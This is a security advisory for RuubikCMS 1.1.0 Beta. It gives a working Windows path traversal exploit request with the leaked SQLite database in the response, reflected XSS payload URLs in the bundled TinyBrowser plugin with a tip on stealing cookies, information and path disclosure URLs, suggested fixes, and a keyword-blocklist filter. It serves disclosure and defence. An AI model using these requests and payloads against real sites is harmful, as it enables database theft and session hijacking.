Vulnerable software: RuubikCMS Version 1.1.0 Beta
Official site: http://www.ruubikcms.com/
Downloaded from: http://www.ruubikcms.com/ruubikcms/download.php?f=ruubikcms111.zip
=========================================================
Tested:
*php.ini MAGIC_QUOTES_GPC OFF*
Safe mode off
/*
OS: Windows XP SP2 (32 bit)
Apache: 2.2.21.0
PHP Version: 5.2.17.17
MYSQL:  5.5.24
=========================================================

VUln Desc:
RuubikCMS Version 1.1.0 Beta is prone to Traversal,XSS,
Info And Path Disclosures.
=========================================================

1) Traversal vuln:
//ruubikcms/extra/image.php
Vulnerable code section:
(To exploit this vuln you need to be authenticated against application)
*This vuln can be exploited by users to escalate privileges to admin on windows OS*
==============SNIP==================
<?php
// --- Image displayer with authentication
// --- Sample call: image.php?f=imgfile.jpg
// --- Sample call with subfolder: image.php?f=subfolder/imgfile.jpg

require(&#039;../ruubikcms/includes/dbconfig.php&#039;);
$dbh = new PDO(PDO_DB_DRIVER.&#039;:../&#039;.RUUBIKCMS_FOLDER.&#039;/&#039;.PDO_DB_FOLDER.&#039;/&#039;.PDO_DB_NAME); // database connection object
require(&#039;../ruubikcms/includes/commonfunc.php&#039;);
define(&#039;LOGOUT_TIME&#039;, query_single("SELECT logout_time FROM options WHERE id = 1"));
require(&#039;login/session.php&#039;);

// check if logged in
if (!@$_SESSION[&#039;uid&#039;]) die("Access denied.");

// images directory
define(&#039;BASE_DIR&#039;,&#039;useruploads/images/&#039;);

// make sure program execution doesn&#039;t time out
@set_time_limit(0);

if (!isset($_GET[&#039;f&#039;]) OR empty($_GET[&#039;f&#039;])) die("Please specify image.");
if (strstr($_GET[&#039;f&#039;], &#039;../&#039;)) die(&#039;Error&#039;);
$fpath = BASE_DIR.$_GET[&#039;f&#039;];
if (!is_file($fpath)) die("File does not exist.");

// file size in bytes
// $fsize = filesize($fpath);

// get mime type
$mtype = &#039;&#039;;

if (function_exists(&#039;mime_content_type&#039;)) {
  $mtype = mime_content_type($fpath);
} elseif (function_exists(&#039;finfo_file&#039;)) {
  $finfo = finfo_open(FILEINFO_MIME); // return mime type
  $mtype = finfo_file($finfo, $fpath);
  finfo_close($finfo);
}

if ($mtype == &#039;&#039;) {
  $mtype = "image/jpeg";
}

header("Content-type: $mtype");
readfile($fpath);
?>
=====================================


We can traverse it on windows OS.
Exploit:

GET /learn/ruubikcms/extra/image.php?f=..\..\..\ruubikcms\sqlite\ruubikcms.sqlite HTTP/1.1
Host: 192.168.0.15
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Cookie: cmslogin=1vbnblnfsb367lgoovsr1qdo2b9c2hav

=============================*RAW responce body:*=============================


HTTP/1.1 200 OK
Date: Tue, 22 May 2012 12:01:24 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: image/jpeg

34800
SQLite format 3???@
??<???????(???????????????????????????????????????????????????????????????
?????????????????????????????????a%tablepagepage
CREATE TABLE "page" ("pageurl" text PRIMARY KEY ,"name" text,"title" text,"header1" text,"description" text,
"keywords" text,"content" text,"mother" text,"levelnum" integer,"ordernum" integer,"image1" text,"image2" text,
"lang" text,"pagetype" integer,"extracode" text,"status" integer, "updater" TEXT, "updated" TEXT, "creator" TEXT)&#039;
;?indexsqlite_autoindex_page_1page?Ytablesitesite
CREATE TABLE "site" ("id" integer PRIMARY KEY ,"name" text,"doctype" integer,"charset" text,"robots" text,
"title" text,"description" text,"keywords" text,"copyright" text,"author" text,"lang" text,"gacode" text,
"news_textlink" INTEGER,"news_readmore" INTEGER,"news_showdate" INTEGER,"news_maxshort" INTEGER, "no_image1"
INTEGER, "no_image2" INTEGER, "clean_url" INTEGER, "url_suffix" TEXT, "news_num" INTEGER, "siteroot" TEXT,
"news_read??????
???
???x?x????????????????????????????????????????????????????????????????????????????????????????
?????????????????????????????????????????????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????????????????????????????????????????????
?????????????????????????????????????????????????????????????????????????????????????????????????????????
???????????????????????????????????????????????????????????????????????????????????????????????????????????
???????????????????????????????????????????????????????????????????????????????????????????????????????????
?????????????????????????????????????????????????????????????????????????????????????????????????????????
?????????????????????????????????????)!%)

G?)!%)

G


?RuubikCMS Demoiso-8859-1index,followRuubikCMS DemoRuubikCMSIisakki Piril, Henrik Valrosfi?n
Read more??????????????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
????????????????????????????????????????????????????????????"



C

??
====================================EOF SNIP=====================================

Use Fiddler to intercept RAW body of responce.




How to fix?:
Open //ruubikcms/extra/image.php
Change the lines no 22 and 23 to this:

//============BEGIN===========
if (strstr(str_ireplace(&#039;\\&#039;,&#039;&#039;,$_GET[&#039;f&#039;]), &#039;../&#039;)) die(&#039;Error&#039;);
$fpath = BASE_DIR.$_GET[&#039;f&#039;];
//============END=============





2) Due several XSS vulns in 3&#039;rd party application called TinyBrowser 1.41
(TinyBrowser 1.41 - A TinyMCE file browser (C) 2008  Bryn Jones
(author website - http://www.lunarvis.com))
 ruubikcms is also vulnerable to XSS.
http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/folders.php?type=image&folder=&feid="/>a<script>alert(1);</script>

http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/edit.php?type=image&folder=&feid="</a><script>alert(1);</script>
http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/edit.php?type=image"</a><script>alert(1);</script>&folder=&feid=owned
http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/upload.php?feid="</a><script>alert("AkaStep");</script>

http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/edit.php?type=image&folder=&find="><script>alert("AkaStep");</script>


HINT: charcode it if you want to steal cookies.


For @admins,@users,@webmasters:
Save all this stuff as antikiddie.php and upload it to:

/ruubikcms/tiny_mce/plugins/tinybrowser/

Then open config_tinybrowser.php and include your antikiddie.php
in config_tinybrowser.php


===================BEGIN==============
<?php
error_reporting(&#039;off&#039;);

/*
 //antikiddie.php
 include it in your /ruubikcms/tiny_mce/plugins/tinybrowser/config_tinybrowser.php
 (at bottom after <?php
 )
 like this:
 include &#039;antikiddie.php&#039;;

 ANOTHER NOTE:
  we can add more tastes here but that may broke
 application&#039;s api.So I removed a lot of tastes from here.
 */

$commonpatterns=array("$","/*","*","union",&#039;"&#039;,&#039;\&#039;&#039;,
"0x",
"where","concat","concat_ws","group_concat",
"information_schema","tables","columns","where","concat","concat_ws","group_concat",
"information_schema","tables","columns",&#039;*&#039;,
"hex","table_name","column_name","distinct",
"/*!","*/","into","load_file",&#039;(&#039;,&#039;)&#039;,
"outfile","truncate","drop",
"delete",";","+","substr","update",
"hex","table_name","column_name",&#039;\x00&#039;,&#039;\n&#039;,&#039;\r&#039;,&#039;\\&#039;,&#039;\\x1a&#039;,
"schemata","mysql","convert","using","char","$","`","|",
"\\","(","from",")",&#039;mysql&#039;,
"table","dumpfile","php",
"distinct",&#039;<&#039;,&#039;>&#039;,&#039;<script>&#039;,&#039;base64&#039;,&#039;alert&#039;,&#039;\\&#039;,&#039;</script>&#039;,&#039;%0d%0a&#039;,
&#039;document.write&#039;,&#039;,&#039;,&#039;String.fromCharCode&#039;,&#039;..&#039;,&#039;document.cookie&#039;,&#039;cookie&#039;,&#039;eval&#039;,&#039;href&#039;,&#039;document.location&#039;,&#039;location.replace&#039;,&#039;window&#039;,
&#039;onmouse&#039;,&#039;onblur&#039;,&#039;onfocus&#039;,&#039;onerror&#039;,&#039;\&#039;&#039;,&#039;limit&#039;,&#039;javascript&#039;);


foreach($commonpatterns as $myvals)
{

if(stristr(urldecode($_SERVER[&#039;QUERY_STRING&#039;]),$myvals))

{


    die(&#039;<script>alert("No Scriptkidding! :)");</script>&#039;. PHP_EOL .
        &#039;<h1>Can\&#039;t Proceed your request! It is malicious.</h1>&#039;);
}
}
unset($myvals);
?>



==================END=================


3)Info disclosure to get more info about system:
http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/error.log


4)Path disclosure:
http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/newsmenu.php


Notice: Use of undefined constant NEWS - assumed &#039;NEWS&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 4
 NEWS

Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 31

Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 31



http://192.168.0.15/learn/ruubikcms/extra/login/session.php



Notice: Use of undefined constant LOGOUT_TIME - assumed &#039;LOGOUT_TIME&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\extra\login\session.php on line 17



http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/dbconnection.php


Notice: Use of undefined constant PDO_DB_DRIVER - assumed &#039;PDO_DB_DRIVER&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\dbconnection.php on line 3

Notice: Use of undefined constant PDO_DB_FOLDER - assumed &#039;PDO_DB_FOLDER&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\dbconnection.php on line 3

Notice: Use of undefined constant PDO_DB_NAME - assumed &#039;PDO_DB_NAME&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\dbconnection.php on line 3
could not find driver


http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/extrapagemenu.php


Notice: Use of undefined constant EXTRAPAGES - assumed &#039;EXTRAPAGES&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\extrapagemenu.php on line 4
EXTRAPAGES



Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\extrapagemenu.php on line 17

Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\extrapagemenu.php on line 17



http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/footer.php

Notice: Use of undefined constant VERSION - assumed &#039;VERSION&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\footer.php on line 5

Notice: Use of undefined constant VERNUM - assumed &#039;VERNUM&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\footer.php on line 5
VERSION VERNUM
Notice: Use of undefined constant THANKYOUTEXT - assumed &#039;THANKYOUTEXT&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\footer.php on line 5

Notice: Use of undefined constant DOCUMENTATION - assumed &#039;DOCUMENTATION&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\footer.php on line 5

Notice: Use of undefined constant FEEDBACK - assumed &#039;FEEDBACK&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\footer.php on line 5
THANKYOUTEXT RuubikCMS | DOCUMENTATION | FEEDBACK



http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/head.php
See title of page.


http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/mainmenu.php
A lot of notices.


http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/multilang.php



Notice: Undefined variable: multilang_links in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\multilang.php on line 2

Warning: Invalid argument supplied for foreach() in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\multilang.php on line 2



http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/newsmenu.php


Notice: Use of undefined constant NEWS - assumed &#039;NEWS&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 4
NEWS

Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 31

Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 31



http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/pagemenu.php


Notice: Use of undefined constant WEBPAGES - assumed &#039;WEBPAGES&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\pagemenu.php on line 4
WEBPAGES



Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\pagemenu.php on line 17

Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\pagemenu.php on line 17


http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/required.php


Warning: require(../includes/dbconfig.php) [function.require]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\required.php on line 4

Fatal error: require() [function.require]: Failed opening required &#039;../includes/dbconfig.php&#039; (include_path=&#039;.;C:\php5\pear&#039;) in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\required.php on line 4


http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/snippetmenu.php

Notice: Use of undefined constant SNIPPETS - assumed &#039;SNIPPETS&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\snippetmenu.php on line 4
SNIPPETS
TinyMCE

Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\snippetmenu.php on line 17

Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\snippetmenu.php on line 17



http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/usersmenu.php

Notice: Use of undefined constant USERS - assumed &#039;USERS&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\usersmenu.php on line 4
USERS

Notice: Use of undefined constant ADMINISTRATORS - assumed &#039;ADMINISTRATORS&#039; in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\usersmenu.php on line 15
ADMINISTRATORS

Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\usersmenu.php on line 21

Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\usersmenu.php on line 21



http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/login/form.php


http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/filelink/filelink.php



http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/tb_standalone.js.php

function tinyBrowserPopUp(type,formelementid,folder)
{ tburl = "/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/tinybrowser.php" + "?type=" +
type + "&feid=" + formelementid; if (folder !== undefined) tburl += "&folder="+folder+"%2F";
newwindow=window.open(tburl,&#039;tinybrowser&#039;,&#039;height=495,width=785,scrollbars=yes,resizable=yes&#039;); if
(window.focus) {newwindow.focus()} return false; }

http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/tb_tinymce.js.php
Contains full path to application in plaintext.

http://192.168.0.15/learn/ruubikcms/ruubikcms/website/scripts/jquery.lightbox-0.5.js.php
Direct Plaintext output.




Workaround about info disclosures:

Open ruubikcms\tiny_mce\plugins\tinybrowser\fns_tinybrowser.php

Change the line no 423 to this:
=========BEGIN========
//error_log($err, 3, &#039;error.log&#039;);
=========END==========


or you can try:


=========BEGIN========
error_log($err, 3, &#039;error_log&#039;);
=========END==========

Do not forget remove your old error.log



Workaround about path disclosures:
Open your main .htaccess files (if it doesn&#039;t exist on public_html/.htaccess)
create new one and copy/paste this:

==========BEGIN======

php_value error_reporting off




==========END========

This will disable all error reporting if any error,warnings,notices occurs.



Vendor Notified about vulns.




++++As always My Special Thanks to:++++
packetstormsecurity.org
packetstormsecurity.com
packetstormsecurity.net
securityfocus.com
cxsecurity.com
security.nnov.ru
securtiyvulns.com &&
to all AA Team
++++++++++++++++++++++++++++++++++++++++
Thank you.

/AkaStep ^_^



